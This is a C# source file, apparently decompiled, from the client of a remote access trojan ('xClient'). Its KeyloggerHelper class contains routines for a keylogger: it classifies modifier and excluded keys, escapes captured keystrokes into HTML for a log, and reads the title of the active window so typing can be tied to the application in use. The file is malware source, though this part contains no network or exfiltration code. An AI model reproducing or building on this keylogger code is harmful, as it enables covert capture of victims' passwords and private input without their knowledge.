using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.Helper;

public static class KeyloggerHelper
{
	public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
	{
		if (pressedKeys != null)
		{
			if (!pressedKeys.Contains((Keys)162) && !pressedKeys.Contains((Keys)163) && !pressedKeys.Contains((Keys)164) && !pressedKeys.Contains((Keys)165) && !pressedKeys.Contains((Keys)91) && !pressedKeys.Contains((Keys)92) && !pressedKeys.Contains((Keys)131072))
			{
				return pressedKeys.Contains((Keys)262144);
			}
			return true;
		}
		return false;
	}

	public static bool IsModifierKey(this Keys key)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Invalid comparison between Unknown and I4
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Invalid comparison between Unknown and I4
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Invalid comparison between Unknown and I4
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Invalid comparison between Unknown and I4
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Invalid comparison between Unknown and I4
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Invalid comparison between Unknown and I4
		if ((int)key != 162 && (int)key != 163 && (int)key != 164 && (int)key != 165 && (int)key != 91 && (int)key != 92 && (int)key != 131072)
		{
			return (int)key == 262144;
		}
		return true;
	}

	public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c)
	{
		return pressedKeys.Contains((Keys)char.ToUpper(c));
	}

	public static bool IsExcludedKey(this Keys k)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Invalid comparison between Unknown and I4
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Invalid comparison between Unknown and I4
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Invalid comparison between Unknown and I4
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Invalid comparison between Unknown and I4
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Invalid comparison between Unknown and I4
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Invalid comparison between Unknown and I4
		if (((int)k < 65 || (int)k > 90) && ((int)k < 96 || (int)k > 111) && ((int)k < 48 || (int)k > 57) && ((int)k < 186 || (int)k > 254) && ((int)k < 160 || (int)k > 161) && (int)k != 20)
		{
			return (int)k == 32;
		}
		return true;
	}

	public static bool DetectKeyHolding(List<char> list, char search)
	{
		return list.FindAll((char s) => s.Equals(search)).Count > 1;
	}

	public static string Filter(char key)
	{
		if (key < ' ')
		{
			return string.Empty;
		}
		return key switch
		{
			'>' => "&gt;", 
			'<' => "&lt;", 
			' ' => "&nbsp;", 
			'"' => "&quot;", 
			'#' => "&#35;", 
			'&' => "&amp;", 
			'\'' => "&apos;", 
			_ => key.ToString(), 
		};
	}

	public static string Filter(string input)
	{
		return input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;")
			.Replace("'", "&apos;");
	}

	public static string GetDisplayName(Keys key, bool altGr = false)
	{
		string text = ((object)(Keys)(ref key)).ToString();
		if (text.Contains("ControlKey"))
		{
			return "Control";
		}
		if (text.Contains("Menu"))
		{
			return "Alt";
		}
		if (text.Contains("Win"))
		{
			return "Win";
		}
		if (text.Contains("Shift"))
		{
			return "Shift";
		}
		return text;
	}

	public static string GetActiveWindowTitle()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		ThreadNativeMethods.GetWindowText(ThreadNativeMethods.GetForegroundWindow(), stringBuilder, stringBuilder.Capacity);
		string text = stringBuilder.ToString();
		if (string.IsNullOrEmpty(text))
		{
			return null;
		}
		return text;
	}
}
